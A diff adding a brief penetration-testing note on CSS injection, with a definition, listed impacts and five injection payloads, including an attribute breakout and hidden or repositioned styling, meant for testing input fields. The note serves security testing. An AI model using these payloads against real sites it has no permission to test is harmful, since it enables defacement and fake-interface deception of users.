@@ -1,0 +1,15 @@
+A vulnerability where an attacker inserts malicious CSS into a web page due to improper input validation, allowing them to alter the page’s appearance or behavior.
+
+Impact:
+Changes website layout or hides elements
+Can trick users with fake UI
+May help in data leakage or further attacks
+
+Payloads:
+'><b/style=position:fixed;top:0;left:0;font-size:200px>XSS<!--
+red; background-color: yellow; font-size: 30px;
+blue; display: none;
+green; position: absolute; top:0; left:0;
+black; background-image: url('http://localhost/test.png');
+
+at pamaters and all input feilds we need to test
